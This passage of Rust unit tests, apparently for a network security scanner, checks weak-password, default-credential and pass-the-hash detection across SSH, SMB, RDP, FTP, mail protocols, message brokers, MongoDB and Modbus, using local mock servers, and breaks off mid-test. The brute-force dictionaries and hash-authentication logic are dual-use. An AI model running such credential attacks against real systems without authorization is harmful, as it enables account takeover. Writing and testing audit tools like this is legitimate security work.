    fn uses_smb_default_dictionary_order() {
        let mut attempts = Vec::new();
        let finding = scan_smb_with(
            &OpenService {
                host: "127.0.0.1".to_string(),
                port: 445,
            },
            &PluginContext {
                usernames: Vec::new(),
                passwords: vec!["123456".to_string()],
                timeout_secs: 2,
                ssh_key_path: None,
            },
            |_, username, password, domain, _| {
                attempts.push((
                    username.to_string(),
                    password.to_string(),
                    domain.to_string(),
                ));
                Ok(username == "administrator" && password == "123456" && domain.is_empty())
            },
        )
        .expect("scan should succeed")
        .expect("smb finding should exist");

        assert_eq!(
            attempts.first(),
            Some(&(
                "administrator".to_string(),
                "123456".to_string(),
                String::new()
            ))
        );
        assert_eq!(finding.details["username"], json!("administrator"));
        assert_eq!(finding.details["password"], json!("123456"));
    }

    #[test]
    fn appends_additive_credentials_to_default_dictionaries_like_go() {
        set_auth_runtime_options(AuthRuntimeOptions {
            extra_usernames: vec!["guest".to_string()],
            extra_passwords: vec!["Summer2024".to_string(), "{user}@2024".to_string()],
            ..AuthRuntimeOptions::default()
        });

        let context = PluginContext {
            usernames: Vec::new(),
            passwords: Vec::new(),
            timeout_secs: 2,
            ssh_key_path: None,
        };
        let usernames = usernames_for_service("ssh", &context);
        let passwords = passwords_for_user(Some("admin"), &context);

        set_auth_runtime_options(AuthRuntimeOptions::default());

        assert!(usernames.iter().any(|item| item == "root"));
        assert!(usernames.iter().any(|item| item == "guest"));
        assert!(passwords.iter().any(|item| item == "123456"));
        assert!(passwords.iter().any(|item| item == "Summer2024"));
        assert!(passwords.iter().any(|item| item == "admin@2024"));
    }

    #[test]
    fn appends_additive_credentials_to_explicit_overrides_like_go() {
        set_auth_runtime_options(AuthRuntimeOptions {
            extra_usernames: vec!["guest".to_string()],
            extra_passwords: vec!["Summer2024".to_string(), "{user}@2024".to_string()],
            ..AuthRuntimeOptions::default()
        });

        let context = PluginContext {
            usernames: vec!["operator".to_string()],
            passwords: vec!["{user}@123".to_string()],
            timeout_secs: 2,
            ssh_key_path: None,
        };
        let usernames = usernames_for_service("ssh", &context);
        let passwords = passwords_for_user(Some("operator"), &context);

        set_auth_runtime_options(AuthRuntimeOptions::default());

        assert_eq!(usernames, vec!["operator".to_string(), "guest".to_string()]);
        assert_eq!(
            passwords,
            vec![
                "operator@123".to_string(),
                "Summer2024".to_string(),
                "operator@2024".to_string()
            ]
        );
    }

    #[test]
    fn detects_smb2_hash_auth_with_domain_runtime_options() {
        set_auth_runtime_options(AuthRuntimeOptions {
            domain: Some("CORP".to_string()),
            hashes: vec!["0123456789abcdef0123456789abcdef".to_string()],
            disable_brute: false,
            ..AuthRuntimeOptions::default()
        });

        let mut attempts = Vec::new();
        let finding = scan_smb2_with(
            &OpenService {
                host: "127.0.0.1".to_string(),
                port: 445,
            },
            &PluginContext {
                usernames: vec!["administrator".to_string()],
                passwords: vec!["ignored".to_string()],
                timeout_secs: 2,
                ssh_key_path: None,
            },
            |_, username, credential, domain, auth_mode, _| {
                attempts.push((
                    username.to_string(),
                    credential.to_string(),
                    domain.to_string(),
                    auth_mode,
                ));
                Ok((username == "administrator"
                    && credential == "0123456789abcdef0123456789abcdef"
                    && domain == "CORP"
                    && auth_mode == Smb2AuthMode::Hash)
                    .then(|| vec!["C$".to_string(), "IPC$".to_string()]))
            },
        )
        .expect("scan should succeed")
        .expect("smb2 finding should exist");

        set_auth_runtime_options(AuthRuntimeOptions::default());

        assert_eq!(
            attempts,
            vec![(
                "administrator".to_string(),
                "0123456789abcdef0123456789abcdef".to_string(),
                "CORP".to_string(),
                Smb2AuthMode::Hash
            )]
        );
        assert_eq!(finding.plugin, "smb2");
        assert_eq!(finding.status, "weak-auth");
        assert_eq!(finding.details["service"], json!("smb2"));
        assert_eq!(finding.details["username"], json!("administrator"));
        assert_eq!(
            finding.details["credential"],
            json!("0123456789abcdef0123456789abcdef")
        );
        assert_eq!(finding.details["auth_type"], json!("hash"));
        assert_eq!(finding.details["domain"], json!("CORP"));
        assert_eq!(finding.details["shares"], json!(vec!["C$", "IPC$"]));
    }

    #[test]
    fn uses_smb2_password_dictionary_when_hashes_absent() {
        set_auth_runtime_options(AuthRuntimeOptions::default());

        let mut attempts = Vec::new();
        let finding = scan_smb2_with(
            &OpenService {
                host: "127.0.0.1".to_string(),
                port: 445,
            },
            &PluginContext {
                usernames: Vec::new(),
                passwords: vec!["123456".to_string()],
                timeout_secs: 2,
                ssh_key_path: None,
            },
            |_, username, credential, domain, auth_mode, _| {
                attempts.push((
                    username.to_string(),
                    credential.to_string(),
                    domain.to_string(),
                    auth_mode,
                ));
                Ok((username == "administrator"
                    && credential == "123456"
                    && domain.is_empty()
                    && auth_mode == Smb2AuthMode::Password)
                    .then(Vec::new))
            },
        )
        .expect("scan should succeed")
        .expect("smb2 finding should exist");

        assert_eq!(
            attempts.first(),
            Some(&(
                "administrator".to_string(),
                "123456".to_string(),
                String::new(),
                Smb2AuthMode::Password
            ))
        );
        assert_eq!(finding.details["credential"], json!("123456"));
        assert_eq!(finding.details["auth_type"], json!("password"));
    }

    #[test]
    fn detects_rdp_weak_password_with_domain_runtime_options() {
        set_auth_runtime_options(AuthRuntimeOptions {
            domain: Some("CORP".to_string()),
            hashes: Vec::new(),
            disable_brute: false,
            ..AuthRuntimeOptions::default()
        });

        let mut attempts = Vec::new();
        let finding = scan_rdp_with(
            &OpenService {
                host: "127.0.0.1".to_string(),
                port: 3389,
            },
            &PluginContext {
                usernames: vec!["administrator".to_string()],
                passwords: vec!["123456".to_string()],
                timeout_secs: 2,
                ssh_key_path: None,
            },
            |_, username, password, domain, _| {
                attempts.push((
                    username.to_string(),
                    password.to_string(),
                    domain.to_string(),
                ));
                Ok(username == "administrator" && password == "123456" && domain == "CORP")
            },
        )
        .expect("scan should succeed")
        .expect("rdp finding should exist");

        set_auth_runtime_options(AuthRuntimeOptions::default());

        assert_eq!(
            attempts,
            vec![(
                "administrator".to_string(),
                "123456".to_string(),
                "CORP".to_string()
            )]
        );
        assert_eq!(finding.plugin, "rdp");
        assert_eq!(finding.status, "weak-password");
        assert_eq!(finding.details["service"], json!("rdp"));
        assert_eq!(finding.details["username"], json!("administrator"));
        assert_eq!(finding.details["password"], json!("123456"));
        assert_eq!(finding.details["domain"], json!("CORP"));
    }

    #[test]
    fn uses_rdp_default_dictionary_order() {
        let mut attempts = Vec::new();
        let finding = scan_rdp_with(
            &OpenService {
                host: "127.0.0.1".to_string(),
                port: 3389,
            },
            &PluginContext {
                usernames: Vec::new(),
                passwords: vec!["123456".to_string()],
                timeout_secs: 2,
                ssh_key_path: None,
            },
            |_, username, password, domain, _| {
                attempts.push((
                    username.to_string(),
                    password.to_string(),
                    domain.to_string(),
                ));
                Ok(username == "administrator" && password == "123456" && domain.is_empty())
            },
        )
        .expect("scan should succeed")
        .expect("rdp finding should exist");

        assert_eq!(
            attempts.first(),
            Some(&(
                "administrator".to_string(),
                "123456".to_string(),
                String::new()
            ))
        );
        assert_eq!(finding.details["username"], json!("administrator"));
        assert_eq!(finding.details["password"], json!("123456"));
    }

    #[test]
    fn matches_go_registry_ports_for_expanded_service_plugins() {
        let ports_by_plugin = registered_plugins()
            .into_iter()
            .map(|plugin| (plugin.key, plugin.ports.to_vec()))
            .collect::<BTreeMap<_, _>>();

        assert_eq!(ports_by_plugin["ssh"], vec![22, 2222]);
        assert_eq!(ports_by_plugin["rdp"], vec![3389, 13389, 33389]);
        assert_eq!(ports_by_plugin["mongodb"], vec![27017, 27018]);
        assert_eq!(ports_by_plugin["kafka"], vec![9092, 9093]);
        assert_eq!(ports_by_plugin["mssql"], vec![1433, 1434]);
        assert_eq!(ports_by_plugin["oracle"], vec![1521, 1522, 1526]);
        assert_eq!(ports_by_plugin["mysql"], vec![3306, 3307, 13306, 33306]);
        assert_eq!(ports_by_plugin["postgres"], vec![5432, 5433]);
    }

    #[test]
    fn selects_comma_separated_plugins_like_go() {
        let plugins = select_plugins("ssh, memcached, ssh");
        let keys = plugins.into_iter().map(|plugin| plugin.key).collect::<Vec<_>>();
        assert_eq!(keys, vec!["ssh".to_string(), "memcached".to_string()]);
    }

    #[test]
    fn detects_ssh_weak_password() {
        let (port, server) = spawn_ssh_server(1, "root", Some("123456"), false);

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "ssh",
            &PluginContext {
                usernames: vec!["root".to_string()],
                passwords: vec!["123456".to_string()],
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "ssh");
        assert_eq!(findings[0].status, "vulnerable");
        assert_eq!(findings[0].details["service"], json!("ssh"));
        assert_eq!(findings[0].details["username"], json!("root"));
        assert_eq!(findings[0].details["password"], json!("123456"));
        assert_eq!(findings[0].details["auth_type"], json!("password"));
    }

    #[test]
    fn detects_ssh_key_authentication() {
        let (port, server) = spawn_ssh_server(1, "root", None, true);
        let key_path = write_test_ssh_key("ssh-plugin");

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "ssh",
            &PluginContext {
                usernames: vec!["root".to_string()],
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: Some(key_path.clone()),
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");
        let _ = fs::remove_file(&key_path);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "ssh");
        assert_eq!(findings[0].status, "vulnerable");
        assert_eq!(findings[0].details["service"], json!("ssh"));
        assert_eq!(findings[0].details["username"], json!("root"));
        assert_eq!(findings[0].details["auth_type"], json!("key"));
    }

    #[test]
    fn detects_ftp_weak_password_with_default_dictionary() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut anonymous_stream, _) =
                listener.accept().expect("anonymous request should arrive");
            anonymous_stream
                .write_all(b"220 FTP ready\r\n")
                .expect("banner should write");
            let mut buffer = [0u8; 1024];
            let count = anonymous_stream
                .read(&mut buffer)
                .expect("user should read");
            assert!(String::from_utf8_lossy(&buffer[..count]).contains("USER anonymous"));
            anonymous_stream
                .write_all(b"331 Need password\r\n")
                .expect("need password should write");
            let count = anonymous_stream
                .read(&mut buffer)
                .expect("password should read");
            assert!(String::from_utf8_lossy(&buffer[..count]).contains("PASS "));
            anonymous_stream
                .write_all(b"530 Login incorrect\r\n")
                .expect("failure should write");

            let (mut weak_stream, _) = listener
                .accept()
                .expect("weak password request should arrive");
            weak_stream
                .write_all(b"220 FTP ready\r\n")
                .expect("banner should write");
            let count = weak_stream.read(&mut buffer).expect("user should read");
            assert!(String::from_utf8_lossy(&buffer[..count]).contains("USER ftp"));
            weak_stream
                .write_all(b"331 Need password\r\n")
                .expect("need password should write");
            let count = weak_stream.read(&mut buffer).expect("password should read");
            assert!(String::from_utf8_lossy(&buffer[..count]).contains("PASS 123456"));
            weak_stream
                .write_all(b"230 Login successful\r\n")
                .expect("success should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "ftp",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "ftp");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["username"], json!("ftp"));
        assert_eq!(findings[0].details["password"], json!("123456"));
    }

    #[test]
    fn detects_telnet_unauthorized_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            stream
                .write_all(b"Welcome to telnet\r\n# ")
                .expect("banner should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "telnet",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "telnet");
        assert_eq!(findings[0].status, "unauthorized-access");
    }

    #[test]
    fn detects_telnet_weak_password_with_default_dictionary() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut probe_stream, _) = listener.accept().expect("probe request should arrive");
            probe_stream
                .write_all(b"login: ")
                .expect("probe banner should write");

            let (mut auth_stream, _) = listener.accept().expect("auth request should arrive");
            auth_stream
                .write_all(b"login: ")
                .expect("banner should write");
            let mut buffer = [0u8; 1024];
            let count = auth_stream.read(&mut buffer).expect("username should read");
            assert!(String::from_utf8_lossy(&buffer[..count]).contains("root"));
            auth_stream
                .write_all(b"Password: ")
                .expect("password prompt should write");
            let count = auth_stream.read(&mut buffer).expect("password should read");
            assert!(String::from_utf8_lossy(&buffer[..count]).contains("123456"));
            auth_stream
                .write_all(b"Welcome\r\n$ ")
                .expect("success should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "telnet",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "telnet");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["username"], json!("root"));
        assert_eq!(findings[0].details["password"], json!("123456"));
    }

    #[test]
    fn detects_smtp_anonymous_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            stream
                .write_all(b"220 mail.example ESMTP ready\r\n")
                .expect("banner should write");
            let mut buffer = [0u8; 1024];

            let size = stream.read(&mut buffer).expect("ehlo should read");
            assert!(String::from_utf8_lossy(&buffer[..size]).contains("EHLO rscan"));
            stream
                .write_all(b"250-mail.example\r\n250 AUTH PLAIN\r\n")
                .expect("ehlo response should write");

            let size = stream.read(&mut buffer).expect("mail should read");
            assert!(String::from_utf8_lossy(&buffer[..size]).contains("MAIL FROM"));
            stream
                .write_all(b"250 Sender OK\r\n")
                .expect("mail response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "smtp",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "smtp");
        assert_eq!(findings[0].status, "anonymous-access");
        assert_eq!(findings[0].details["anonymous"], json!(true));
    }

    #[test]
    fn detects_smtp_anonymous_access_over_tls_fallback() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();
        listener
            .set_nonblocking(true)
            .expect("listener should become nonblocking");
        let config = tls_test_config();

        let server = thread::spawn(move || {
            let deadline = Instant::now() + Duration::from_secs(3);
            while Instant::now() < deadline {
                match listener.accept() {
                    Ok((stream, _)) => {
                        stream
                            .set_read_timeout(Some(Duration::from_secs(1)))
                            .expect("read timeout should set");
                        stream
                            .set_write_timeout(Some(Duration::from_secs(1)))
                            .expect("write timeout should set");
                        let conn =
                            ServerConnection::new(config.clone()).expect("server conn should build");
                        let mut tls = StreamOwned::new(conn, stream);
                        if tls.conn.complete_io(&mut tls.sock).is_err() {
                            continue;
                        }

                        tls.write_all(b"220 mail.example ESMTP ready\r\n")
                            .expect("banner should write");
                        let mut buffer = [0u8; 1024];

                        let size = tls.read(&mut buffer).expect("ehlo should read");
                        let request = String::from_utf8_lossy(&buffer[..size]);
                        assert!(request.contains("EHLO rscan"));
                        tls.write_all(b"250-mail.example\r\n250 AUTH PLAIN\r\n")
                            .expect("ehlo response should write");

                        let size = tls.read(&mut buffer).expect("mail from should read");
                        let request = String::from_utf8_lossy(&buffer[..size]);
                        assert!(request.contains("MAIL FROM:<test@test.com>"));
                        tls.write_all(b"250 OK\r\n").expect("mail response should write");
                        tls.flush().expect("response should flush");
                        return;
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(20));
                    }
                    Err(error) => panic!("accept failed: {error}"),
                }
            }
            panic!("timed out waiting for TLS SMTP request");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "smtp",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "smtp");
        assert_eq!(findings[0].status, "anonymous-access");
        assert_eq!(findings[0].details["anonymous"], json!(true));
    }

    #[test]
    fn detects_pop3_weak_password_with_default_dictionary() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            stream
                .write_all(b"+OK POP3 ready\r\n")
                .expect("banner should write");
            let mut buffer = [0u8; 1024];

            let size = stream.read(&mut buffer).expect("user should read");
            let request = String::from_utf8_lossy(&buffer[..size]);
            assert!(request.contains("USER admin"));
            stream
                .write_all(b"+OK user accepted\r\n")
                .expect("user response should write");

            let size = stream.read(&mut buffer).expect("pass should read");
            let request = String::from_utf8_lossy(&buffer[..size]);
            assert!(request.contains("PASS 123456"));
            stream
                .write_all(b"+OK mailbox locked and ready\r\n")
                .expect("pass response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "pop3",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "pop3");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["username"], json!("admin"));
        assert_eq!(findings[0].details["password"], json!("123456"));
        assert_eq!(findings[0].details["tls"], json!(false));
    }

    #[test]
    fn detects_pop3_weak_password_over_tls_fallback() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();
        listener
            .set_nonblocking(true)
            .expect("listener should become nonblocking");
        let config = tls_test_config();

        let server = thread::spawn(move || {
            let deadline = Instant::now() + Duration::from_secs(2);
            while Instant::now() < deadline {
                match listener.accept() {
                    Ok((stream, _)) => {
                        stream
                            .set_read_timeout(Some(Duration::from_secs(1)))
                            .expect("read timeout should set");
                        stream
                            .set_write_timeout(Some(Duration::from_secs(1)))
                            .expect("write timeout should set");
                        let conn =
                            ServerConnection::new(config.clone()).expect("server conn should build");
                        let mut tls = StreamOwned::new(conn, stream);
                        if tls.conn.complete_io(&mut tls.sock).is_err() {
                            continue;
                        }
                        tls.write_all(b"+OK POP3 ready\r\n")
                            .expect("banner should write");
                        let mut buffer = [0u8; 1024];

                        let size = tls.read(&mut buffer).expect("user should read");
                        let request = String::from_utf8_lossy(&buffer[..size]);
                        assert!(request.contains("USER admin"));
                        tls.write_all(b"+OK user accepted\r\n")
                            .expect("user response should write");

                        let size = tls.read(&mut buffer).expect("pass should read");
                        let request = String::from_utf8_lossy(&buffer[..size]);
                        assert!(request.contains("PASS 123456"));
                        tls.write_all(b"+OK mailbox locked and ready\r\n")
                            .expect("pass response should write");
                        tls.flush().expect("response should flush");
                        return;
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(20));
                    }
                    Err(error) => panic!("accept failed: {error}"),
                }
            }
            panic!("timed out waiting for TLS POP3 request");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "pop3",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "pop3");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["username"], json!("admin"));
        assert_eq!(findings[0].details["password"], json!("123456"));
        assert_eq!(findings[0].details["tls"], json!(true));
    }

    #[test]
    fn detects_imap_weak_password_with_default_dictionary() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            stream
                .write_all(b"* OK IMAP ready\r\n")
                .expect("banner should write");
            let mut buffer = [0u8; 1024];

            let size = stream.read(&mut buffer).expect("login should read");
            let request = String::from_utf8_lossy(&buffer[..size]);
            assert!(request.contains("a001 LOGIN \"admin\" \"123456\""));
            stream
                .write_all(b"a001 OK LOGIN completed\r\n")
                .expect("login response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "imap",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "imap");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["username"], json!("admin"));
        assert_eq!(findings[0].details["password"], json!("123456"));
    }

    #[test]
    fn detects_imap_weak_password_over_tls_fallback() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();
        listener
            .set_nonblocking(true)
            .expect("listener should become nonblocking");
        let config = tls_test_config();

        let server = thread::spawn(move || {
            let deadline = Instant::now() + Duration::from_secs(2);
            while Instant::now() < deadline {
                match listener.accept() {
                    Ok((stream, _)) => {
                        stream
                            .set_read_timeout(Some(Duration::from_secs(1)))
                            .expect("read timeout should set");
                        stream
                            .set_write_timeout(Some(Duration::from_secs(1)))
                            .expect("write timeout should set");
                        let conn =
                            ServerConnection::new(config.clone()).expect("server conn should build");
                        let mut tls = StreamOwned::new(conn, stream);
                        if tls.conn.complete_io(&mut tls.sock).is_err() {
                            continue;
                        }
                        tls.write_all(b"* OK IMAP ready\r\n")
                            .expect("banner should write");
                        let mut buffer = [0u8; 1024];

                        let size = tls.read(&mut buffer).expect("login should read");
                        let request = String::from_utf8_lossy(&buffer[..size]);
                        assert!(request.contains("a001 LOGIN \"admin\" \"123456\""));
                        tls.write_all(b"a001 OK LOGIN completed\r\n")
                            .expect("login response should write");
                        tls.flush().expect("response should flush");
                        return;
                    }
                    Err(error) if error.kind() == ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(20));
                    }
                    Err(error) => panic!("accept failed: {error}"),
                }
            }
            panic!("timed out waiting for TLS IMAP request");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "imap",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "imap");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["username"], json!("admin"));
        assert_eq!(findings[0].details["password"], json!("123456"));
    }

    #[test]
    fn detects_activemq_weak_password() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let mut buffer = [0u8; 2048];
            let size = stream.read(&mut buffer).expect("frame should read");
            let request = String::from_utf8_lossy(&buffer[..size]);
            assert!(request.contains("login:admin"));
            assert!(request.contains("passcode:admin"));
            stream
                .write_all(b"CONNECTED\nversion:1.2\n\n\x00")
                .expect("response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "activemq",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "activemq");
        assert_eq!(findings[0].status, "weak-password");
        assert_eq!(findings[0].details["username"], json!("admin"));
        assert_eq!(findings[0].details["password"], json!("admin"));
    }

    #[test]
    fn detects_rsync_anonymous_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut list_stream, _) = listener.accept().expect("list request should arrive");
            list_stream
                .write_all(b"@RSYNCD: 31.0\n")
                .expect("greeting should write");
            let mut buffer = [0u8; 1024];
            let mut transcript = String::new();
            while !transcript.contains("#list") {
                let size = list_stream
                    .read(&mut buffer)
                    .expect("list command should read");
                transcript.push_str(&String::from_utf8_lossy(&buffer[..size]));
            }
            assert!(transcript.contains("@RSYNCD: 31.0"));
            assert!(transcript.contains("#list"));
            list_stream
                .write_all(b"public\tPublic module\n@RSYNCD: EXIT\n")
                .expect("module list should write");

            let (mut auth_stream, _) = listener.accept().expect("auth request should arrive");
            auth_stream
                .write_all(b"@RSYNCD: 31.0\n")
                .expect("auth greeting should write");
            transcript.clear();
            while !transcript.contains("public") {
                let size = auth_stream.read(&mut buffer).expect("module should read");
                transcript.push_str(&String::from_utf8_lossy(&buffer[..size]));
            }
            assert!(transcript.contains("@RSYNCD: 31.0"));
            assert!(transcript.contains("public"));
            auth_stream
                .write_all(b"@RSYNCD: OK\n")
                .expect("ok should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "rsync",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "rsync");
        assert_eq!(findings[0].status, "anonymous-access");
        assert_eq!(findings[0].details["module"], json!("public"));
    }

    #[test]
    fn detects_rabbitmq_weak_password_with_mock_connector() {
        let mut attempts = Vec::new();
        let finding = scan_rabbitmq_with(
            &OpenService {
                host: "127.0.0.1".to_string(),
                port: 5672,
            },
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
            |_, username, password, _| {
                attempts.push((username.to_string(), password.to_string()));
                Ok(username == "guest" && password == "guest")
            },
        )
        .expect("scan should succeed")
        .expect("rabbitmq finding should exist");

        assert_eq!(
            attempts.first(),
            Some(&("guest".to_string(), "guest".to_string()))
        );
        assert_eq!(finding.plugin, "rabbitmq");
        assert_eq!(finding.status, "weak-password");
        assert_eq!(finding.details["username"], json!("guest"));
        assert_eq!(finding.details["password"], json!("guest"));
    }

    #[test]
    fn does_not_treat_http_management_api_as_rabbitmq_auth() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let mut buffer = [0u8; 2048];
            let _ = stream.read(&mut buffer);
            let body = r#"{"management_version":"3.13"}"#;
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            stream
                .write_all(response.as_bytes())
                .expect("response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "rabbitmq",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert!(findings.is_empty());
    }

    #[test]
    fn detects_mongodb_unauthorized_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let mut buffer = [0u8; 2048];
            let size = stream.read(&mut buffer).expect("request should read");
            assert!(size > 16);
            assert_eq!(&buffer[12..16], &[0xdd, 0x07, 0x00, 0x00]);
            stream
                .write_all(b"\x7f\x00\x00\x00totalLinesWritten")
                .expect("response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "mongodb",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "mongodb");
        assert_eq!(findings[0].status, "unauthorized-access");
        assert_eq!(findings[0].details["service"], json!("mongodb"));
        assert_eq!(findings[0].details["type"], json!("unauthorized-access"));
    }

    #[test]
    fn detects_modbus_unauthorized_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let mut buffer = [0u8; 64];
            let size = stream.read(&mut buffer).expect("request should read");
            assert_eq!(&buffer[..size], modbus_request_packet().as_slice());
            stream
